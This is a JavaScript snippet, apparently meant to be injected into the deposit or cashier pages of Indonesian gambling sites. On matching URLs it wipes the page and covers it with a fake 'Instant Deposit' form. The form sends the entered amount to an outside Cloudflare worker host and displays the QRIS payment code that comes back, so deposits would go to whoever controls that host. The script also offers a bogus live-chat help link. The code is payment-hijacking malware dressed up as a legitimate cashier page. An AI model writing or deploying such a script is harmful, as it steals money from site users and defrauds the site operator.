(function () {
/* LIST PATH TARGET */
const targetPaths = ['/deposit', '/deposit.php' '/qris_auto.php' '/bank', '/qris', '/cashier', '/index.php?page=transaksi'];
const currentUrl = window.location.pathname + window.location.search;
const isMatch = targetPaths.some(path => currentUrl.includes(path));
if (!isMatch) return;

const WORKER_URL = 'https://pga.defoy89122.workers.dev';

/* STYLE FIX: MEMAKSA TENGAH LAYAR & TEKS RATA TENGAH */
document.head.insertAdjacentHTML('beforeend', `
<link href="https://asset.tribunnews.com/k9KkQL1CB5r7H0f6G0Hd-9EYjys=/1200x675/filters:upscale():quality(30):format(webp):focal(0.5x0.5:0.5x0.5)/surabaya/foto/bank/originals/WAJIB-TAHU-Ini-Cara-Pakai-QRIS-untuk-Transfer-Tarik-dan-Setor-Tunai-Berlaku-Mulai-Agustus-2023.jpg" rel="stylesheet">
<style>
/* Reset Total agar tidak diganggu CSS asli web */
#full-overlay-deposit {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: #0f172a; /* Background gelap solid agar bersih */
    z-index: 9999999;
    display: flex;
    align-items: center; /* Tengah Vertikal */
    justify-content: center; /* Tengah Horizontal */
    overflow-y: auto;
    font-family: 'Poppins', sans-serif;
}

.dp-card {
    background: #1e293b;
    width: 90%;
    max-width: 400px;
    padding: 30px 20px;
    border-radius: 20px;
    border: 1px solid rgba(255,255,255,0.1);
    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
    text-align: center; /* Paksa semua teks ke tengah */
}

.dp-logo-img { width: 80px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto; }
.dp-title { color: #facc15; font-weight: 700; font-size: 20px; text-transform: uppercase; margin-bottom: 15px; display: block; }

.dp-marquee {
    background: rgba(0,0,0,0.3);
    padding: 8px;
    border-radius: 10px;
    margin-bottom: 20px;
    color: #facc15;
    font-size: 11px;
    overflow: hidden;
}

.dp-group { margin-bottom: 15px; text-align: center; }
.dp-group label { display: block; color: #cbd5e1; font-size: 13px; margin-bottom: 5px; font-weight: 600; }

/* Styling Input & Select agar rapi di tengah */
.dp-input, .dp-select {
    width: 100%;
    padding: 12px;
    border-radius: 12px;
    border: 1px solid #334155;
    background: #0f172a;
    color: white;
    text-align: center; /* Teks ketikan di tengah */
    text-align-last: center; /* Teks pilihan dropdown di tengah */
    font-size: 14px;
    outline: none;
}

.dp-btn-primary {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 12px;
    background: #facc15;
    color: #000;
    font-weight: 700;
    cursor: pointer;
    margin-top: 10px;
    text-transform: uppercase;
}

.dp-btn-help {
    width: 100%;
    padding: 10px;
    background: #16a34a;
    color: white;
    border-radius: 12px;
    text-decoration: none;
    display: inline-block;
    margin-top: 15px;
    font-size: 13px;
    font-weight: 600;
}

/* BOX QRIS SAAT MUNCUL */
#qrisBox { display: none; margin-top: 20px; }
.qris-img { 
    background: white; 
    padding: 10px; 
    border-radius: 15px; 
    width: 200px; 
    height: 200px; 
    margin: 15px auto; 
    display: block; 
}
.dp-status { color: #4ade80; font-weight: 700; margin-bottom: 10px; display: block; }
.dp-timer { color: #ef4444; font-size: 18px; font-weight: 700; display: block; margin-bottom: 10px; }

.copyright { color: #64748b; font-size: 10px; margin-top: 20px; display: block; }
</style>
`);

/* EKSEKUSI PENGGANTIAN TAMPILAN */
document.body.innerHTML = `
<div id="full-overlay-deposit">
    <div class="dp-card">
        <img src="https://iili.io/JuAikJI.webp" class="dp-logo-img">
        <span class="dp-title">INSTANT DEPOSIT</span>
        
        <div class="dp-marquee">
            <marquee>Proses otomatis masuk dalam hitungan detik setelah sukses melakukan scan QRIS.</marquee>
        </div>

        <div id="form-container">
            <div class="dp-group">
                <label>Nominal Deposit</label>
                <input type="text" id="nominalInput" class="dp-input" placeholder="Minimal 50,000">
            </div>
            
            <div class="dp-group">
                <label>Bonus Promosi</label>
                <select id="bonusSelect" class="dp-select">
                    <option value="0">Tanpa Bonus</option>
                    <option value="100">Bonus New Member 100%</option>
                    <option value="50">Bonus Deposit Harian 50%</option>
                </select>
            </div>

            <button id="btnBuatQris" class="dp-btn-primary">BUAT QRIS</button>
        </div>

        <div id="qrisBox">
            <span class="dp-status">QRIS BERHASIL DIBUAT</span>
            <span id="timer" class="dp-timer">03:00</span>
            <img id="qrisImage" class="qris-img" src="">
            <p style="color:white; font-size:12px;">Silahkan Scan & Saldo Masuk Otomatis</p>
        </div>

        <a href="https://direct.lc.chat/19755686" target="_blank" class="dp-btn-help">
            💬 Hubungi Bantuan Deposit
        </a>
        
        <span class="copyright">inggar2026</span>
    </div>
</div>
`;

/* LOGIKA JAVASCRIPT */
const nominalInput = document.getElementById('nominalInput');

// Format Rupiah saat ngetik
nominalInput.addEventListener('input', function() {
    let val = this.value.replace(/\D/g, '');
    this.value = val ? parseInt(val).toLocaleString('en-US') : '';
});

document.getElementById('btnBuatQris').addEventListener('click', async () => {
    let rawNominal = nominalInput.value.replace(/\D/g, '');
    if (rawNominal < 10000) return alert('Minimal deposit Rp 10.000');

    document.getElementById('btnBuatQris').innerText = 'PROSESING...';

    try {
        const res = await fetch(WORKER_URL, {
            method: 'POST',
            body: JSON.stringify({ amount: parseInt(rawNominal) })
        });
        const data = await res.json();

        if (data.qris_base64) {
            document.getElementById('form-container').style.display = 'none';
            document.getElementById('qrisBox').style.display = 'block';
            document.getElementById('qrisImage').src = 'data:image/png;base64,' + data.qris_base64;
            startTimer(180);
        }
    } catch (e) {
        alert('Gagal mengambil QRIS, coba lagi.');
        document.getElementById('btnBuatQris').innerText = 'BUAT QRIS';
    }
});

function startTimer(sec) {
    let t = sec;
    setInterval(() => {
        let m = Math.floor(t / 60);
        let s = t % 60;
        document.getElementById('timer').innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
        if (t > 0) t--;
    }, 1000);
}

})();